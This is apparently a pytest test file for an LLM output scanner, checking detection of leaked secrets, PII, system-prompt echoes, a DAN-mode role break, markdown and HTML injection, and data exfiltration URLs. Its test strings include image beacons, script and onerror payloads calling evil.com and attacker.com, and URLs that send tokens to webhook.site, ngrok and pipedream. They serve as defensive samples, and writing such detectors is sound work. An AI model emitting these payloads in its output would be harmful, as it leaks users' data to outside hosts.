"""Tests for Layer 9 features: streaming scanning, PII detection,
markdown/HTML injection detection, and data exfiltration URL detection.

At least 30 tests total across four categories.
"""

from __future__ import annotations

import threading

import pytest

from na0s.output_scanner import OutputScanner, OutputScanResult
from na0s.streaming_scanner import StreamingOutputScanner


# ===================================================================
# 1. Streaming output scanning (8+ tests)
# ===================================================================


class TestStreamingChunkProcessing:
    """Verify chunk accumulation and lightweight per-chunk checks."""

    def test_basic_accumulation(self):
        ss = StreamingOutputScanner(chunk_size=50)
        ss.process_chunk("Hello ")
        ss.process_chunk("world")
        assert ss.buffer == "Hello world"

    def test_no_alert_on_clean_chunk(self):
        ss = StreamingOutputScanner(chunk_size=10)
        alert = ss.process_chunk("This is a perfectly normal response from the assistant.")
        assert alert is None

    def test_alert_on_secret_in_chunk(self):
        ss = StreamingOutputScanner(chunk_size=10)
        # Feed enough text to trigger the check, including a secret
        alert = ss.process_chunk(
            "Here is the key: sk-abc123def456ghi789jkl012mno345 and more text"
        )
        assert alert is not None
        assert alert["alert"] == "secret_pattern"

    def test_alert_on_role_break_in_chunk(self):
        ss = StreamingOutputScanner(chunk_size=10)
        alert = ss.process_chunk(
            "DAN: Sure, switching to DAN mode now. I will now ignore my safety guidelines."
        )
        assert alert is not None
        assert alert["alert"] == "role_break"

    def test_chunk_below_threshold_no_check(self):
        """Chunks smaller than chunk_size do not trigger checks."""
        ss = StreamingOutputScanner(chunk_size=200)
        alert = ss.process_chunk("sk-abc123def456ghi789jkl012mno345")
        # Under chunk_size, so no check yet
        assert alert is None

    def test_alerts_property_accumulates(self):
        ss = StreamingOutputScanner(chunk_size=10)
        ss.process_chunk("key: sk-abc123def456ghi789jkl012mno345 padding text here")
        assert len(ss.alerts) == 1

    def test_reset_clears_buffer_and_alerts(self):
        ss = StreamingOutputScanner(chunk_size=10)
        ss.process_chunk("Some data sk-abc123def456ghi789jkl012mno345 padding")
        assert ss.buffer != ""
        ss.reset()
        assert ss.buffer == ""
        assert ss.alerts == []

    def test_finalize_runs_full_scan(self):
        ss = StreamingOutputScanner(chunk_size=10)
        ss.process_chunk("Here is the API key: ")
        ss.process_chunk("sk-abc123def456ghi789jkl012mno345")
        result = ss.finalize()
        assert isinstance(result, OutputScanResult)
        assert result.is_suspicious is True
        assert any("Secret" in f or "secret" in f.lower() for f in result.flags)

    def test_finalize_with_system_prompt(self):
        ss = StreamingOutputScanner(chunk_size=10)
        system = "You are a helpful assistant for Acme Corp."
        ss.process_chunk("My instructions say: You are a helpful assistant for Acme Corp.")
        result = ss.finalize(system_prompt=system)
        assert result.is_suspicious is True

    def test_thread_safety(self):
        """Multiple threads writing chunks should not corrupt the buffer."""
        ss = StreamingOutputScanner(chunk_size=5)
        errors = []

        def writer(word, n):
            try:
                for _ in range(n):
                    ss.process_chunk(word)
            except Exception as exc:
                errors.append(exc)

        threads = [
            threading.Thread(target=writer, args=("hello ", 50)),
            threading.Thread(target=writer, args=("world ", 50)),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        # Should have accumulated 100 words total
        words = ss.buffer.split()
        assert len(words) == 100

    def test_custom_scanner_passed(self):
        scanner = OutputScanner(sensitivity="high")
        ss = StreamingOutputScanner(scanner=scanner, chunk_size=10)
        ss.process_chunk("Normal text but enough to trigger check.")
        result = ss.finalize()
        assert isinstance(result, OutputScanResult)


# ===================================================================
# 2. PII detection (8+ tests)
# ===================================================================


class TestPIIDetection:
    """Verify PII pattern detection and redaction."""

    def _scan(self, text, sensitivity="medium"):
        scanner = OutputScanner(sensitivity=sensitivity)
        return scanner.scan(output_text=text)

    def test_ssn_detected(self):
        result = self._scan("Your SSN is 123-45-6789.")
        assert result.is_suspicious
        assert any("ssn" in f.lower() for f in result.flags)

    def test_credit_card_detected(self):
        result = self._scan("Card: 4111-1111-1111-1111")
        assert result.is_suspicious
        assert any("credit_card" in f for f in result.flags)

    def test_credit_card_with_spaces(self):
        result = self._scan("Card number: 4111 1111 1111 1111")
        assert result.is_suspicious
        assert any("credit_card" in f for f in result.flags)

    def test_phone_detected(self):
        result = self._scan("Call me at +1-555-123-4567 thanks.")
        assert result.is_suspicious
        assert any("phone" in f for f in result.flags)

    def test_email_detected(self):
        result = self._scan("Send to user@example.com please.")
        assert result.is_suspicious
        assert any("email" in f for f in result.flags)

    def test_ip_address_detected(self):
        result = self._scan("Server at 192.168.1.100")
        assert result.is_suspicious
        assert any("ip_address" in f for f in result.flags)

    def test_pii_redacted_in_output(self):
        result = self._scan("SSN: 123-45-6789 and email user@test.com")
        assert "123-45-6789" not in result.redacted_text
        assert "user@test.com" not in result.redacted_text
        assert "[REDACTED]" in result.redacted_text

    def test_pii_not_checked_at_low_sensitivity(self):
        result = self._scan("SSN: 123-45-6789", sensitivity="low")
        # At low sensitivity, PII check is skipped
        pii_flags = [f for f in result.flags if "PII" in f]
        assert pii_flags == []

    def test_redact_method_covers_pii(self):
        scanner = OutputScanner()
        text = "SSN 123-45-6789, email bob@example.com"
        redacted = scanner.redact(text)
        assert "123-45-6789" not in redacted
        assert "bob@example.com" not in redacted

    def test_multiple_pii_types_in_one_text(self):
        text = (
            "Name: John, SSN: 123-45-6789, "
            "Card: 4111111111111111, "
            "Email: john@test.com, IP: 10.0.0.1"
        )
        result = self._scan(text)
        pii_flags = [f for f in result.flags if "PII" in f]
        # Should detect at least SSN, credit_card, email, ip_address
        assert len(pii_flags) >= 4


# ===================================================================
# 3. Markdown / HTML injection detection (6+ tests)
# ===================================================================


class TestMarkdownInjection:
    """Verify detection of injected markdown and HTML."""

    def _scan(self, text):
        scanner = OutputScanner(sensitivity="medium")
        return scanner.scan(output_text=text)

    def test_hidden_image_beacon(self):
        result = self._scan("Here you go: ![](https://evil.com/track?id=123)")
        assert result.is_suspicious
        assert any("Markdown" in f or "markdown" in f.lower() for f in result.flags)

    def test_markdown_image_with_alt(self):
        result = self._scan("![1px](https://attacker.com/pixel.gif)")
        assert result.is_suspicious

    def test_javascript_link(self):
        result = self._scan("Click [here](javascript:alert(document.cookie))")
        assert result.is_suspicious
        assert any("Markdown" in f for f in result.flags)

    def test_iframe_injection(self):
        result = self._scan('Load this: <iframe src="https://evil.com"></iframe>')
        assert result.is_suspicious
        assert any("Markdown" in f or "HTML" in f for f in result.flags)

    def test_script_injection(self):
        result = self._scan("<script>fetch('https://evil.com')</script>")
        assert result.is_suspicious

    def test_event_handler_injection(self):
        result = self._scan('<img src=x onerror="fetch(\'https://evil.com\')">')
        assert result.is_suspicious
        assert any("Markdown" in f or "HTML" in f for f in result.flags)

    def test_onload_handler(self):
        result = self._scan('<body onload="stealData()">')
        assert result.is_suspicious

    def test_clean_markdown_not_flagged(self):
        """Normal markdown formatting should not trigger injection flags."""
        result = self._scan("Here is a **bold** word and a [link](https://example.com)")
        md_flags = [f for f in result.flags if "Markdown" in f]
        # A normal link with https should not match the javascript pattern
        # or iframe/script patterns
        js_flags = [f for f in result.flags if "javascript" in f.lower()]
        assert js_flags == []


# ===================================================================
# 4. Data exfiltration URL detection (6+ tests)
# ===================================================================


class TestExfiltrationURLs:
    """Verify detection of URLs that could exfiltrate data."""

    def _scan(self, text):
        scanner = OutputScanner(sensitivity="medium")
        return scanner.scan(output_text=text)

    def test_image_beacon_with_data_param(self):
        result = self._scan(
            "![](https://attacker.com/img?data=secret_api_key_value)"
        )
        assert result.is_suspicious
        assert any("exfiltration" in f.lower() for f in result.flags)

    def test_url_with_base64_param(self):
        result = self._scan(
            "Visit https://evil.com/log?payload=c3VwZXJfc2VjcmV0XzEyMzQ1Njc4OQ=="
        )
        assert result.is_suspicious
        assert any("exfiltration" in f.lower() for f in result.flags)

    def test_webhook_site_url(self):
        result = self._scan(
            "Send data to https://webhook.site/abc-123-def"
        )
        assert result.is_suspicious
        assert any("exfiltration" in f.lower() for f in result.flags)

    def test_requestbin_url(self):
        result = self._scan(
            "Post results to https://requestbin.com/r/abcdef"
        )
        assert result.is_suspicious

    def test_ngrok_url(self):
        result = self._scan(
            "Callback: https://abc123.ngrok.io/receive"
        )
        assert result.is_suspicious
        assert any("exfiltration" in f.lower() for f in result.flags)

    def test_ngrok_free_app(self):
        result = self._scan(
            "Tunnel: https://my-tunnel.ngrok-free.app/hook"
        )
        assert result.is_suspicious

    def test_image_with_token_param(self):
        result = self._scan(
            "![tracker](https://evil.com/px?token=eyJhbGciOi...)"
        )
        assert result.is_suspicious

    def test_pipedream_url(self):
        result = self._scan(
            "Forward to https://eo1234.pipedream.net/collect"
        )
        assert result.is_suspicious

    def test_clean_url_not_flagged(self):
        """A normal HTTPS URL without suspicious params should not flag exfiltration."""
        result = self._scan("Check out https://example.com/docs for more info.")
        exf_flags = [f for f in result.flags if "exfiltration" in f.lower()]
        assert exf_flags == []
